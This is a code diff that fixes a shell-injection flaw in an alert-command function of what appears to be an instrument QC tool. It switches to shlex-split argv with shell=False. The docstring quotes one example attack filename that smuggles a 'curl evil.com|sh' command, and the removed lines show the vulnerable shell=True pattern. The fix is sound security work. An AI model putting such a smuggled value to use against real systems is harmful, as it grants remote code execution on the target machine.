@@ -163,20 +163,50 @@ def _run_alert_command(
     run_name: str,
     decision: GateDecision,
 ) -> None:
-    """Execute a shell alert command with template substitution."""
-    cmd = (
-        command_template
-        .replace("{instrument}", instrument)
-        .replace("{run}", run_name)
-        .replace("{result}", decision.result.value)
-        .replace("{diagnosis}", decision.diagnosis)
-        .replace("{failed_gates}", ", ".join(decision.failed_gates))
-    )
+    """Execute an alert command with template substitution.
+
+    v0.2.307: substitution is now done AFTER shlex.split so
+    operator-controlled values (raw filename, diagnosis text) land
+    inside individual argv items and can't break out into shell
+    metacharacters. Pre-fix this called subprocess.run(shell=True),
+    which gave any operator who could name a raw file
+    `qc_normal;curl evil.com|sh.raw` arbitrary RCE on the
+    instrument PC the next time alerts fired. Same fix shape as
+    other dashboard / control entry points: parse the template
+    once into argv, then substitute into the individual tokens.
+    """
+    import shlex
+
+    try:
+        argv = shlex.split(command_template)
+    except ValueError as e:
+        logger.warning(
+            "alert_command template is unparseable (%s); skipping for %s",
+            e, run_name,
+        )
+        return
+    if not argv:
+        return
+
+    subs = {
+        "{instrument}": instrument,
+        "{run}": run_name,
+        "{result}": decision.result.value,
+        "{diagnosis}": decision.diagnosis,
+        "{failed_gates}": ", ".join(decision.failed_gates),
+    }
+
+    def _sub(token: str) -> str:
+        for k, v in subs.items():
+            token = token.replace(k, v)
+        return token
+
+    argv = [_sub(a) for a in argv]
 
     try:
         subprocess.run(
-            cmd,
-            shell=True,
+            argv,
+            shell=False,  # critical — see docstring
             check=False,
             capture_output=True,
             text=True,
@@ -185,5 +215,7 @@ def _run_alert_command(
         logger.info("Alert command executed for %s: %s", run_name, decision.result.value)
     except subprocess.TimeoutExpired:
         logger.warning("Alert command timed out for %s", run_name)
+    except FileNotFoundError:
+        logger.warning("Alert command binary not found: %s", argv[0])
     except Exception:
         logger.exception("Alert command failed for %s", run_name)
